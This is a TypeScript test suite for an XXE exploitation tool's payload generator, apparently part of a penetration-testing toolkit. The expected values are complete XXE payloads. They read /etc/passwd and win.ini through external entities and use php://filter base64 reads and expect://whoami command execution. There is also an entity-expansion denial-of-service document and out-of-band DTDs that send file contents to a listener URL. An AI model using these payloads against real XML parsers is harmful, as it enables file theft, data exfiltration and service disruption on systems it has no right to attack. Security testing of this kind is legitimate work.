/* eslint-disable @typescript-eslint/ban-ts-ignore */

import { expect } from 'chai';
import { PayloadGenerator, Encoding, Type, Mode } from '../src/PayloadGenerator';
import * as Axios from 'axios';


describe('Payload Generator', () => {

  const readFileEntiity = { name: "file", parameter: false, system: true, value: "/etc/passwd" };
  const generator = new PayloadGenerator("127.0.0.1", 18363);


  it("shoudl generate a xee payload", () => {
    const xee = PayloadGenerator.xee(10);

    expect(xee).to.eq(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxexploiter [
   <!ENTITY ent0 "Ea velit aute anim voluptate aliquip id aute dolore do culpa nisi quis officia sunt quis elit ex sed elit.">
   <!ENTITY ent1 "&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;&ent0;">
]>

    <xxexploiter>
      <value>&ent1;</value>
    </xxexploiter>`);
  });


  it("should generate file OOB payload with template", async () => {
    const p = generator.generate(Type.file, Mode.OOB, Encoding.NORMAL, "/c:/Windows/win.ini", "<root>{{XXE}}</root>");
    expect(p).to.eq(`<!DOCTYPE xxexploiter [
   <!ENTITY % extDTD SYSTEM "http://127.0.0.1:18363/1.dtd">
   %extDTD;
   %extraction;
   %OOB;
]>
<root></root>`);

    const r = await Axios.default.get("http://127.0.0.1:18363/1.dtd");
    expect(r.data).to.eq(`<!ENTITY % dataextractionfile SYSTEM "file:///c:/Windows/win.ini">\n<!ENTITY % extraction "<!ENTITY &#x25; OOB SYSTEM 'http://127.0.0.1:18363/?p=%dataextractionfile;'>">\n`);

  }); //end of test


  it('should generate regular file payload with template', () => {
    const p = generator.generate(Type.file, Mode.XML, Encoding.NORMAL, "/c:/Windows/win.ini", "<root>{{XXE}}</root>");

    expect(p).to.eq(
      `<!DOCTYPE xxexploiter [
   <!ENTITY payload SYSTEM "file:///c:/Windows/win.ini">
]>
<root>&payload;</root>`);

  }); //end of test

  it('should generate regular file payload to use with php base64 encode', () => {
    const p = generator.generate(Type.file, Mode.XML, Encoding.PHP_BASE64, "/c:/Windows/win.ini", "<root>{{XXE}}</root>");

    expect(p).to.eq(
      `<!DOCTYPE xxexploiter [
   <!ENTITY payload SYSTEM "php://filter/read=convert.base64-encode/resource=/c:/Windows/win.ini">
]>
<root>&payload;</root>`);

  }); //end of test




  it('should generate cdata file payload with template', async () => {
    const p = generator.generate(Type.file, Mode.CDATA, Encoding.NORMAL, "/c:/Windows/win.ini", "<root>{{XXE}}</root>");

    expect(p).to.eq(
      `<!DOCTYPE xxexploiter [
   <!ENTITY % extDTD SYSTEM "http://127.0.0.1:18363/2.dtd">
   %extDTD;
   %all;
]>
<root>&content;</root>`);


    const r = await Axios.default.get("http://127.0.0.1:18363/2.dtd");
    expect(r.data).to.eq(`<!ENTITY % start "<![CDATA[">\n<!ENTITY % path SYSTEM "file:///c:/Windows/win.ini">\n<!ENTITY % end "]]>">\n<!ENTITY % all "<!ENTITY content '%start;%path;%end;'>">\n`);

  }); //end of test





  it('should generate expect schema', () => {
    // @ts-ignore
    const s = PayloadGenerator.schema("whoami", Type.expect);
    expect(s).to.eq("expect://whoami");
  });

  it('should generate file schema', () => {
    // @ts-ignore
    const s = PayloadGenerator.schema("/etc/passwd", Type.file);
    expect(s).to.eq("file:///etc/passwd");
  });


  it('should replace xml placeholder', () => {
    // @ts-ignore
    const s = PayloadGenerator.replacePlaceholderWithEntity("<root>{{XXE}}</root>", "test");
    expect(s).to.eq("<root>&test;</root>");
  });

  it('should return string to call entity', () => {
    // @ts-ignore
    const s = PayloadGenerator.callEntity("test");
    expect(s).to.eq("&test;");
  });

  it('should inject doc type', () => {
    // @ts-ignore
    const s = PayloadGenerator.injectDocType("<?xml something><root></root>", "doctype");
    expect(s).to.eq("<?xml something>\ndoctype<root></root>");
  });

  it('should create strings for entities', () => {
    // @ts-ignore
    const s = PayloadGenerator.createEntityString({ name: "file", parameter: true, system: true, value: "/etc/passwd" });
    expect(s).to.eq('<!ENTITY % file SYSTEM "/etc/passwd">\n');

    // @ts-ignore
    const s2 = PayloadGenerator.createEntityString({ name: "file", parameter: false, system: true, value: "/etc/passwd" });
    expect(s2).to.eq('<!ENTITY file SYSTEM "/etc/passwd">\n');

    // @ts-ignore
    const s3 = PayloadGenerator.createEntityString({ name: "file", parameter: true, system: false, value: "/etc/passwd" });
    expect(s3).to.eq('<!ENTITY % file "/etc/passwd">\n');

    // // @ts-ignore
    // const s4 = PayloadGenerator.createEntityString({ name: "file", parameter: true, system: false, value: "file:///etc/passwd" }, Encoding.PHP_BASE64, true);
    // expect(s4).to.eq('<!ENTITY &#x25; file \'php://filter/read=convert.base64-encode/resource=file:///etc/passwd\'>');
  });

  it('should create doctype', () => {
    // @ts-ignore
    const s = PayloadGenerator.createDocType([
      readFileEntiity,
      "<ENTITY file2 SYSTEM \"/etc/passwd\""
    ]);

    expect(s).to.eq('<!DOCTYPE xxexploiter [\n   <!ENTITY file SYSTEM "/etc/passwd">\n   <ENTITY file2 SYSTEM "/etc/passwd"\n]>\n');
  });


  it('should create DTD for data extraction', () => {

    const ent = { name: "file", parameter: true, system: true, value: "file:///etc/passwd" };
    // @ts-ignore
    const s = generator.generateExtractionDTD(ent, Encoding.NORMAL);
    expect(s).to.eq('<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % extraction "<!ENTITY &#x25; OOB SYSTEM \'http://127.0.0.1:18363/?p=%file;\'>">\n');
  });

  generator.server.stop();


});